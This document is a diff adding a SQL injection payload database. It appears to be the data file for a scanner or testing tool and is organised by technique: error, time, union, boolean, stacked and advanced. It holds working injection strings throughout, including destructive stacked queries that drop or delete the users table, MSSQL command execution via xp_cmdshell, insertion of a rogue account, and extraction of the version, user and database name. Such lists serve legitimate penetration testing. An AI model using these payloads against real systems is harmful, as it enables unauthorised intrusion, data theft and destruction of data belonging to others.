@@ -1,0 +1,50 @@
+# SQL Injection Payloads Database
+# Author: Olanite Daniel Pelumi
+# Format: TYPE|PAYLOAD|DESCRIPTION
+
+# Error-based payloads
+ERROR|'|Single quote test
+ERROR|''|Double quote test
+ERROR|' OR '1'='1|Basic OR condition
+ERROR|' OR 1=1--|Comment bypass MySQL
+ERROR|' OR '1'='1' --|Space comment bypass
+ERROR|' OR '1'='1' /*|Multi-line comment bypass
+ERROR|' OR 1=1#|Hash comment MySQL
+ERROR|') OR ('1'='1|Parenthesis closure
+ERROR|')) OR (('1'='1|Double parenthesis
+ERROR|'; EXEC xp_cmdshell 'dir'--|MSSQL command execution
+ERROR|' UNION SELECT NULL--|UNION test single column
+ERROR|' UNION SELECT NULL,NULL--|UNION test two columns
+ERROR|' UNION SELECT NULL,NULL,NULL--|UNION test three columns
+
+# Time-based payloads (PAYLOAD|DELAY_SECONDS)
+TIME|' AND SLEEP(5)--|5|MySQL time delay
+TIME|'; WAITFOR DELAY '0:0:5'--|5|MSSQL time delay
+TIME|' AND pg_sleep(5)--|5|PostgreSQL time delay
+TIME|1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)--|5|MySQL blind subquery
+
+# Union-based payloads
+UNION|' UNION SELECT NULL--|Single column UNION
+UNION|' UNION SELECT NULL,NULL--|Two column UNION
+UNION|' UNION SELECT NULL,NULL,NULL--|Three column UNION
+UNION|1' UNION SELECT 1,2,3--|Numeric UNION test
+UNION|' UNION SELECT 1,2,3,4,5--|Five column UNION
+
+# Boolean-based payloads
+BOOLEAN|' AND 1=1|True condition
+BOOLEAN|' AND 1=2|False condition
+BOOLEAN|' AND 'a'='a|String true
+BOOLEAN|' AND 'a'='b|String false
+
+# Stacked queries
+STACKED|'; DROP TABLE users--|Dangerous - DROP table
+STACKED|'; DELETE FROM users--|Dangerous - DELETE data
+STACKED|'; INSERT INTO users VALUES ('hacker','pass')--|INSERT injection
+
+# Advanced payloads
+ADVANCED|' OR 1=1 LIMIT 1--|Limit bypass
+ADVANCED|' OR 1=1 ORDER BY 1--|ORDER BY injection
+ADVANCED|' OR 1=1 GROUP BY 1--|GROUP BY injection
+ADVANCED|' AND 1=0 UNION SELECT @@version--|Version extraction
+ADVANCED|' AND 1=0 UNION SELECT user()--|User extraction
+ADVANCED|' AND 1=0 UNION SELECT database()--|Database name extraction
